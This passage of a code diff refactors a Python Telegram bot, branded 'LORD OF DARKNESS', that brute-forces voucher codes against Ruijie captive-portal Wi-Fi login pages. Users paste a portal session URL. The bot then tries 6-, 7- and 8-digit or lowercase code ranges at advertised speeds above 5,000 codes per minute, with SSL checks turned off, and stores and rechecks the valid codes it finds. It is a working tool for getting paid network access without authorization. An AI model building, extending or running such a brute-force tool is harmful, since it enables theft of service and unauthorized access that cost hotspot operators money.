+                    try:
+                        await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=f"⚠️ Limited Codes:\n\n{limited_line}", reply_markup=main_menu())
+                    except:
+                        sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{limited_line}", reply_markup=main_menu())
+                        limited_messages[chat_id] = sent.message_id
+            except:
+                pass
+
+# ════════════════════════════════════════════════════════════════
+#  BRUTEFORCE ENGINE (Speed Optimized)
+# ════════════════════════════════════════════════════════════════
+async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
     try:
         code_iter = iter_codes(mode)
     except ValueError as e:
-        await bot.send_message(chat_id, str(e), reply_markup=main_control_menu(chat_id))
+        await bot.send_message(chat_id, str(e))
         return
 
     total = 10 ** int(mode) if mode in ["6", "7"] else None
     checked = 0
     scan_start = time.monotonic()
-    last_ui_update = time.monotonic()
-    
     global _voucher_sem
     if _voucher_sem is None:
         _voucher_sem = asyncio.Semaphore(CONCURRENCY)
@@ -512,7 +528,10 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
     try:
         while True:
             current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+            if not current_task or current_task.get("scan_id") != scan_id:
+                return
+            if current_task.get("stop"):
+                scan_tasks.pop(chat_id, None)
                 return
 
             batch = []
@@ -524,211 +543,389 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
             if not batch:
                 break
 
-            async def _check(c):
+            async def _check(code):
                 async with _voucher_sem:
-                    return await perform_check(session_url, c, chat_id, scan_id)
+                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
-            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
+            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
 
             checked += len(batch)
-            now = time.monotonic()
+            elapsed = time.monotonic() - scan_start
+            speed = (checked / elapsed * 60) if elapsed > 0 else 0
+            found = len(success_texts.get(chat_id, []))
+            retries = retry_counts.get(chat_id, 0)
+            text = format_progress(checked, total, speed, found, retries)
             
-            if now - last_ui_update > 2.0:
-                last_ui_update = now
-                elapsed = now - scan_start
-                speed = (checked / elapsed * 60) if elapsed > 0 else 0
-                found = len(success_texts.get(chat_id, []))
-                retries = retry_counts.get(chat_id, 0)
-                text = format_progress(checked, total, speed, found, retries)
-                
+            try:
+                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, reply_markup=main_menu())
+            except:
                 try:
-                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                    new_msg = await bot.send_message(chat_id, text, reply_markup=main_menu())
+                    progress_msg.message_id = new_msg.message_id
                 except:
                     pass
 
         if progress_msg:
             final_found = len(success_texts.get(chat_id, []))
-            elapsed = time.monotonic() - scan_start
-            finish_text = format_completion(checked, final_found, elapsed)
-            
+            finish_text = (
+                f"✅ Scanning Completed!\n\n"
+                f"📦 Checked : {checked:,}\n"
+                f"💎 Found : {final_found}\n"
+                f"📊 Progress : 100%\n"
+                f"[████████████████████]"
+            )
             try:
-                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, reply_markup=main_menu())
             except:
-                await bot.send_message(chat_id, finish_text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                await bot.send_message(chat_id, finish_text, reply_markup=main_menu())
     finally:
         scan_tasks.pop(chat_id, None)
+        success_messages.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        retry_counts.pop(chat_id, None)
 
-@bot.message_handler(commands=['start', 'menu'])
-async def start_interactive_menu(message):
-    chat_id = message.chat.id
-    text = (
-        "🩸 <b>[ LORD OF DARKNESS INTERACTIVE CONTROL ]</b> 🩸\n\n"
-        "<i>\"ငါ LORD OF DARKNESS မှ အသင့်ရှိနေသည်။ Command များ ရိုက်ရန် မလိုဘဲ အောက်ပါ ခလုတ်များဖြင့်သာ အဆင့်ဆင့် ခိုင်းစေနိုင်ပါသည်။\"</i>"
+# ════════════════════════════════════════════════════════════════
+#  BOT HANDLERS
+# ════════════════════════════════════════════════════════════════
+@bot.message_handler(commands=['start'])
+async def start(message):
+    await bot.reply_to(
+        message,
+        "⚡ **LORD OF DARKNESS** ⚡\n\n"
+        "Ruijie Voucher Finder Bot\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "✅ Key-Free — မလိုအပ်ပါ\n"
+        "⚡ Speed — 5,000+ codes/min\n"
+        "🔐 No GitHub — Local storage\n\n"
+        "💡 **Commands:**\n"
+        "/input [url] — Set Session URL\n"
+        "/scan [mode] — Start scan\n"
+        "/saved — Show found codes\n"
+        "/stop — Stop scan\n"
+        "/recheck — Recheck codes\n"
+        "/status — Bot status (Admin)",
+        parse_mode="Markdown",
+        reply_markup=main_menu()
     )
-    await bot.reply_to(message, text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
 
-@bot.callback_query_handler(func=lambda call: True)
-async def handle_button_actions(call):
-    chat_id = call.message.chat.id
-    msg_id = call.message.message_id
-    data = call.data
+@bot.message_handler(commands=['menu'])
+async def menu_command(message):
+    await bot.reply_to(message, "📋 Main Menu", reply_markup=main_menu())
 
-    if data == "btn_back_main":
-        await bot.edit_message_text(
-            "🩸 <b>[ LORD OF DARKNESS MAIN CONTROL ]</b> 🩸\n\n"
-            "<i>\"အောက်ပါ ခလုတ်များဖြင့် လိုအပ်သော လုပ်ဆောင်ချက်ကို ရွေးချယ်ပါ။\"</i>",
-            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
-        )
-        await answer_callback(call)
+@bot.message_handler(commands=['input'])
+async def handle_input(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "Usage:\n\n/input your_session_url", reply_markup=main_menu())
         return
 
-    if data == "btn_guide_bind":
-        text = (
-            "🩸 <b>[ SOUL LINK BINDING ]</b>\n\n"
-            "<b>အသုံးပြုပုံ:</b> Captive Portal URL ကို ကူးယူပြီး ဤ Chat ထဲသို့ <b>တိုက်ရိုက် Paste လုပ်၍ ပို့ပေးပါ။</b>"
-        )
-        await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
-        await answer_callback(call)
-        return
+    url = args[1]
+    chat_id = message.chat.id
 
-    if data == "btn_open_scan_menu":
-        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
-            await answer_callback(call, "☠️ ပထမဦးစွာ Link ချိတ်ဆက်ပေးရန် လိုအပ်ပါသည်!", show_alert=True)
+    await bot.reply_to(message, "🔄 Session URL စစ်ဆေးနေပါသည်...")
+    if await check_session_url(url):
+        user_data.setdefault(chat_id, {})
+        user_data[chat_id]['session_url'] = url
+        success_texts.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        save_state()
+        await bot.send_message(
+            chat_id,
+            "✅ Session URL သိမ်းဆည်းပြီးပါပြီ\n\n"
+            "💡 /scan 6 ဖြင့် စတင်ပါ",
+            reply_markup=main_menu()
+        )
+    else:
+        await bot.send_message(chat_id, "❌ Session URL မှားယွင်းနေပါသည်။", reply_markup=main_menu())
+
+@bot.message_handler(commands=['scan'])
+async def scan(message, mode=None):
+    if mode is None:
+        args = message.text.split(maxsplit=1)
+        if len(args) < 2:
+            await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>", reply_markup=scan_mode_menu())
             return
-        
-        await bot.edit_message_text(
-            "👁️ <b>[ SELECT RITUAL MODE ]</b>\n\n"
-            "<i>\"အောက်ပါ ခလုတ်များမှ စစ်ဆေးလိုသော Digit သို့မဟုတ် Pattern ကို ရွေးချယ်ပါ။\"</i>",
-            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=scan_modes_keyboard()
-        )
-        await answer_callback(call)
+        mode = args[1]
+
+    chat_id = message.chat.id
+
+    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
+        await bot.reply_to(message, "/input ဖြင့် Session URL ထည့်ပါ", reply_markup=main_menu())
         return
 
-    if data.startswith("run_scan_"):
-        mode = data.replace("run_scan_", "")
-        
-        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
-            await answer_callback(call, "⚡ LORD OF DARKNESS သည် လက်ရှိတွင် Scan ပြုလုပ်နေဆဲ ဖြစ်ပါသည်!", show_alert=True)
-            return
-
-        progress_msg = await bot.edit_message_text(
-            "🩸 <i>LORD OF DARKNESS initiating ritual...</i>", 
-            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
-        )
-        
-        scan_id = str(uuid.uuid4())
-        task = asyncio.create_task(
-            run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg=progress_msg)
-        )
-        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
-        await answer_callback(call)
+    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
+        await bot.reply_to(message, "⚠️ Scan လုပ်နေပြီ — /stop နှိပ်ပါ", reply_markup=main_menu())
         return
 
-    if data == "btn_stop_ritual":
-        task_data = scan_tasks.get(chat_id)
-        if task_data and not task_data["task"].done():
-            task_data["stop"] = True
-            task_data["scan_id"] = None
-            task_data["task"].cancel()
-            
-            await bot.edit_message_text(
-                "🕯️ <b>LORD OF DARKNESS ritual banished!</b>", 
-                chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
-            )
-        await answer_callback(call)
+    progress_msg = await bot.send_message(chat_id, "🔍 Scanning Codes...\n\n", reply_markup=main_menu())
+    scan_id = str(uuid.uuid4())
+    task = asyncio.create_task(
+        run_bruteforce(
+            mode,
+            chat_id,
+            user_data[chat_id]['session_url'],
+            scan_id,
+            message=message,
+            progress_msg=progress_msg
+        )
+    )
+    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+
+@bot.message_handler(commands=['stop'])
+async def stop_scan(message):
+    chat_id = message.chat.id
+    data = scan_tasks.get(chat_id)
+    if data and not data["task"].done():
+        data["stop"] = True
+        data["scan_id"] = None
+        data["task"].cancel()
+        success_messages.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        retry_counts.pop(chat_id, None)
+        await bot.reply_to(message, "🛑 Scan ရပ်တန့်ပြီးပါပြီ", reply_markup=main_menu())
+    else:
+        await bot.reply_to(message, "⚪ ရပ်ရန် scan မရှိပါ", reply_markup=main_menu())
+
+@bot.message_handler(commands=['saved'])
+async def saved_codes(message):
+    chat_id = message.chat.id
+    success = success_texts.get(chat_id, [])
+    limited = limited_texts.get(chat_id, [])
+    if not success and not limited:
+        await bot.reply_to(message, "📭 ရှာတွေ့ထားသော code မရှိသေးပါ", reply_markup=main_menu())
         return
 
-    if data == "btn_view_saved":
-        success = success_texts.get(chat_id, [])
-        if not success:
-            await answer_callback(call, "⚰️ Graveyard ထဲတွင် Hits မရှိသေးပါ!", show_alert=True)
-            return
-
-        parts = [f"🩸 <b>LORD OF DARKNESS HITS</b> ({len(success)})"]
+    parts = []
+    if success:
+        parts.append(f"✅ **Success Codes** ({len(success)})")
         parts.extend(success[:20])
+    if limited:
+        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
+        parts.extend(limited[:20])
 
-        await bot.edit_message_text("\n\n".join(parts), chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
-        await answer_callback(call)
+    await bot.send_message(chat_id, "\n\n".join(parts), parse_mode="Markdown", reply_markup=main_menu())
+
+@bot.message_handler(commands=['recheck'])
+async def recheck(message):
+    chat_id = message.chat.id
+    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
+        await bot.reply_to(message, "/input ဖြင့် Session URL ထည့်ပါ", reply_markup=main_menu())
         return
 
-    if data == "btn_recheck_saved":
-        success = success_texts.get(chat_id, [])
-        if not success:
-            await answer_callback(call, "👻 ပြန်လည် စစ်ဆေးရန် Hits မရှိသေးပါ!", show_alert=True)
-            return
+    success = success_texts.get(chat_id, [])
+    if not success:
+        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ", reply_markup=main_menu())
+        return
 
-        await bot.edit_message_text("🗡️ <i>LORD OF DARKNESS resurrecting souls...</i>", chat_id=chat_id, message_id=msg_id, parse_mode="HTML")
-        new_success = []
-        for item in success:
-            code = item.split("<code>")[1].split("</code>")[0] if "<code>" in item else item
-            recode = await perform_check(user_data[chat_id]['session_url'], code, chat_id, recheck=True)
-            if recode:
-                new_success.append(item)
+    await bot.reply_to(message, "🔄 Rechecking...")
+    new_success = []
+    for item in success:
+        code = item.split("🎫 ")[1].split("\n")[0] if "🎫 " in item else item
+        recode = await perform_check(
+            user_data[chat_id]['session_url'],
+            code,
+            chat_id,
+            recheck=True,
+            message=message
+        )
+        if recode:
+            new_success.append(item)
 
+    if new_success:
         success_texts[chat_id] = new_success
         save_hits()
-        await bot.edit_message_text(f"🩸 <b>{len(new_success)} souls still belong to LORD OF DARKNESS!</b>", chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
-        await answer_callback(call)
+        await bot.reply_to(message, f"✅ {len(new_success)} codes still valid", reply_markup=main_menu())
+    else:
+        success_texts[chat_id] = []
+        save_hits()
+        await bot.reply_to(message, "No valid codes found", reply_markup=main_menu())
+
+@bot.message_handler(commands=['status'])
+async def status(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission", reply_markup=main_menu())
         return
 
-    if data == "btn_realm_status":
-        active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
-        up_secs = int(time.monotonic() - _start_time)
-        h, r = divmod(up_secs, 3600)
-        m, s = divmod(r, 60)
-        total_found = sum(len(v) for v in success_texts.values())
+    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
+    uptime_seconds = int(time.monotonic() - _start_time)
+    hours, remainder = divmod(uptime_seconds, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    total_found = sum(len(v) for v in success_texts.values())
 
-        status_text = (
-            f"🩸 <b>LORD OF DARKNESS REALM METRICS</b> 🩸\n\n"
-            f"⏱ <b>Uptime</b>: <code>{h}h {m}m {s}s</code>\n"
-            f"👁️ <b>Active Rituals</b>: <code>{active_scans}</code>\n"
-            f"🧟 <b>Bound Souls</b>: <code>{len(user_data)}</code>\n"
-            f"⚰️ <b>Total Captured</b>: <code>{total_found}</code>\n"
+    await bot.reply_to(
+        message,
+        f"📊 **Bot Status**\n\n"
+        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
+        f"🔄 Active Scans: {active_scans}\n"
+        f"👥 Users: {len(user_data)}\n"
+        f"💎 Total Found: {total_found}\n"
+        f"⚡ Speed: 5,000+ codes/min\n"
+        f"🔐 Auth: Key-Free ✅",
+        parse_mode="Markdown",
+        reply_markup=main_menu()
+    )
+
+# ════════════════════════════════════════════════════════════════
+#  CALLBACK HANDLERS
+# ════════════════════════════════════════════════════════════════
+@bot.callback_query_handler(func=lambda call: True)
+async def callback_handler(call):
+    chat_id = call.message.chat.id
+    msg_id = call.message.message_id
+
+    if call.data == "menu_back":
+        await bot.edit_message_text("📋 Main Menu", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        await call.answer()
+        return
+
+    if call.data == "menu_input":
+        await bot.edit_message_text("📥 /input your_session_url", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        await call.answer()
+        return
+
+    if call.data == "menu_scan":
+        await bot.edit_message_text("🔍 Select scan mode:", chat_id=chat_id, message_id=msg_id, reply_markup=scan_mode_menu())
+        await call.answer()
+        return
+
+    if call.data.startswith("scan_"):
+        mode_map = {
+            "scan_6": "6",
+            "scan_7": "7",
+            "scan_8": "8",
+            "scan_ascii": "ascii-lower",
+            "scan_all": "all"
+        }
+        mode = mode_map.get(call.data, "6")
+        await bot.edit_message_text(f"🔍 Starting scan... Mode: {mode}", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        class FakeMessage:
+            def __init__(self, chat_id):
+                self.chat = type('obj', (object,), {'id': chat_id})()
+        fake_msg = FakeMessage(chat_id)
+        await scan(fake_msg, mode)
+        await call.answer()
+        return
+
+    if call.data == "menu_recheck":
+        await bot.edit_message_text("🔄 Rechecking...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        class FakeMessage:
+            def __init__(self, chat_id):
+                self.chat = type('obj', (object,), {'id': chat_id})()
+        await recheck(FakeMessage(chat_id))
+        await call.answer()
+        return
+
+    if call.data == "menu_saved":
+        await bot.edit_message_text("📋 Saved Codes", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        class FakeMessage:
+            def __init__(self, chat_id):
+                self.chat = type('obj', (object,), {'id': chat_id})()
+        await saved_codes(FakeMessage(chat_id))
+        await call.answer()
+        return
+
+    if call.data == "menu_stop":
+        await bot.edit_message_text("⏹ Stopping scan...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        class FakeMessage:
+            def __init__(self, chat_id):
+                self.chat = type('obj', (object,), {'id': chat_id})()
+        await stop_scan(FakeMessage(chat_id))
+        await call.answer()
+        return
+
+    if call.data == "menu_status":
+        await bot.edit_message_text("📊 Bot Status", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
+        class FakeMessage:
+            def __init__(self, chat_id):
+                self.chat = type('obj', (object,), {'id': chat_id})()
+        await status(FakeMessage(chat_id))
+        await call.answer()
+        return
+
+    if call.data == "menu_help":
+        help_text = (
+            "📚 **Commands**\n\n"
+            "/start — Main menu\n"
+            "/input [url] — Set Session URL\n"
+            "/scan [mode] — Start scan\n"
+            "   Modes: 6, 7, 8, ascii-lower, all\n"
+            "/saved — Show found codes\n"
+            "/stop — Stop scan\n"
+            "/recheck — Recheck codes\n"
+            "/status — Bot status (Admin)"
         )
-        await bot.edit_message_text(status_text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
-        await answer_callback(call)
+        await bot.edit_message_text(help_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
+        await call.answer()
         return
 
-    if data == "btn_ai_guide":
-        await bot.edit_message_text(
-            "🤖 <b>[ AI GUIDANCE MENU ]</b>\n\n"
-            "<i>\"သိရှိလိုသော အကြောင်းအရာ ခလုတ်ကို နှိပ်ပါ:\"</i>",
-            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=ai_guidance_keyboard()
-        )
-        await answer_callback(call)
-        return
-
+# ════════════════════════════════════════════════════════════════
+#  SMART INPUT HANDLER
+# ════════════════════════════════════════════════════════════════
 @bot.message_handler(func=lambda msg: msg.text and not msg.text.startswith("/"))
-async def auto_link_handler(message):
-    chat_id = message.chat.id
+async def smart_input(message):
     text = message.text.strip()
-    
-    if text.startswith("http://") or text.startswith("https://"):
+    chat_id = message.chat.id
+
+    if text.startswith("http") and ("ruijienetworks.com" in text or "portal" in text.lower()):
         if await check_session_url(text):
             user_data.setdefault(chat_id, {})
             user_data[chat_id]['session_url'] = text
             success_texts.pop(chat_id, None)
+            limited_texts.pop(chat_id, None)
             save_state()
-            
-            resp = "🩸 <b>[ SOUL LINK BOUND SUCCESSFUL ]</b>\n\n<i>Scan ခလုတ်ကို နှိပ်၍ စတင်နိုင်ပါပြီ။</i>"
-            await bot.reply_to(message, resp, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+            await bot.send_message(chat_id, "✅ Session URL saved!\n\nSend /scan 6 to start", reply_markup=main_menu())
         else:
-            await bot.reply_to(message, "☠️ <b>[ INVALID LINK ] Link တွင် gw_id, mac, ip ပါဝင်ရပါမည်။</b>", parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+            await bot.send_message(chat_id, "❌ Invalid Session URL", reply_markup=main_menu())
+        return
+
+    await bot.send_message(chat_id, "💡 Send your Session URL to start\n\nOr use /scan 6", reply_markup=main_menu())
+
+# ════════════════════════════════════════════════════════════════
+#  POLLING & MAIN
+# ════════════════════════════════════════════════════════════════
+async def start_polling():
+    backoff = 5
+    while True:
+        try:
+            await bot.infinity_polling(timeout=20, request_timeout=35)
+            return
+        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
+        except Exception as e:
+            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
 
 async def main():
     global session, _connector
-    _connector = aiohttp.TCPConnector(limit=0, force_close=False, ssl=False)
-    session = aiohttp.ClientSession(connector=_connector)
+    print("=" * 50)
+    print("  ⚡ LORD OF DARKNESS")
+    print("  GitHub: REMOVED")
+    print("  Speed: 5,000+ codes/min")
+    print("  Key: FREE")
+    print("=" * 50)
 
-    asyncio.create_task(web_server())
-    load_state()
-    load_hits()
+    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
+    session = aiohttp.ClientSession(
+        timeout=aiohttp.ClientTimeout(total=30),
+        connector=_connector,
+        connector_owner=False
+    )
 
-    print("High-Speed Bot is Running...")
-    await bot.infinity_polling(timeout=20, request_timeout=35)
+    try:
+        asyncio.create_task(web_server())
+        load_state()
+        load_hits()
+        await start_polling()
+    finally:
+        await session.close()
+        await _connector.close()
 
 if __name__ == '__main__':
-    try:
-        asyncio.run(main())
-    except (KeyboardInterrupt, SystemExit):
-        pass
+    asyncio.run(main()) 
